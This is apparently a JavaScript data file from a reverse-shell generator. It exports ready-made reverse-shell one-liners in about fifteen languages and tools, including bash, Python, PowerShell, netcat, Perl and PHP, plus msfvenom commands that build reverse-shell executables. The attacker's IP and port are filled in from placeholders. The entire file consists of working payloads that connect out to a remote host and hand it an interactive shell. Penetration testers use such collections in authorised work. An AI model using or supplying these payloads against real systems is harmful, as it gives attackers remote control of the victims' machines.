const IP = "#{IP}";
const PORT = "#{PORT}";

export default {
  "🎗️ Awk": `awk 'BEGIN {s = "/inet/tcp/0/${IP}/${PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  "🔤 C": `gcc -o reverse_shell -x c - <<< '#include <stdio.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in sa;sa.sin_family=AF_INET;sa.sin_addr.s_addr=inet_addr("${IP}");sa.sin_port=htons(${PORT});connect(s,(struct sockaddr *)&sa,sizeof(sa));dup2(s,0);dup2(s,1);dup2(s,2);execve("/bin/sh",NULL,NULL);}'`,
  "🦀 Rust": `rustc -o reverse_shell - <<< 'use std::net::{TcpStream, SocketAddr};use std::process::{Command, Stdio};fn main() {let addr: SocketAddr = "${IP}:${PORT}".parse().expect("Failed to parse address");let stream = TcpStream::connect(addr).expect("Failed to connect");let command = Command::new("/bin/sh").stdin(Stdio::from(stream.try_clone().expect("Failed to clone stream"))).stdout(Stdio::from(stream.try_clone().expect("Failed to clone stream"))).stderr(Stdio::from(stream.try_clone().expect("Failed to clone stream"))).spawn().expect("Failed to execute command");command.wait().expect("Command failed");}'`,
  "☕ Java": `javac -d . <<< "import java.io.*;import java.net.*;public class R{public static void main(String[]a)throws Exception{var s=new Socket(\"${IP}\",${PORT});var i=s.getInputStream();var o=s.getOutputStream();var p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();while(!s.isClosed()){while(i.available()>0)o.write(i.read());while(p.getInputStream().available()>0)o.write(p.getInputStream().read());o.flush();}}}"`,
  "🐚 Bash TCP": `bash -i >& /dev/tcp/${IP}/${PORT} 0>&1`,
  "🐚 Bash UDP": `sh -i >& /dev/udp/${IP}/${PORT} 0>&1`,
  "🔮 Perl": `perl -e 'use Socket;$i="${IP}";$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  "🐘 PHP": `php -r '$sock=fsockopen("${IP}",${PORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  "💎 Ruby": `ruby -rsocket -e'f=TCPSocket.open("${IP}",${PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  "🚀 Go": `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${IP}:${PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/x.go && go run /tmp/x.go && rm /tmp/x.go`,
  "🟢 Nodejs": `node -e "const net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);const client = new net.Socket();client.connect(${PORT}, '${IP}', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"`,
  "🐍 Python ": `python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${IP}",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")`,
  "🌙 Lua": `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${IP}','${PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
  "💥 Powershell": `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${IP}',${PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  "🐱‍💻 Netcat (OpenBSD)": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f`,
  "🐱‍💻 Netcat (traditional)": `nc -e /bin/sh ${IP} ${PORT}`,
  "🕷️ Metasploit Windows Stageless reverse TCP": `msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > reverse.exe`,
  "🕷️ Metasploit Windows Staged reverse TCP": `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > reverse.exe`,
  "🕷️ Metasploit Linux Staged reverse TCP": `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf >reverse.elf`,
  "🕷️ Metasploit Linux Stageless reverse TCP": `msfvenom -p linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf >reverse.elf`,
};
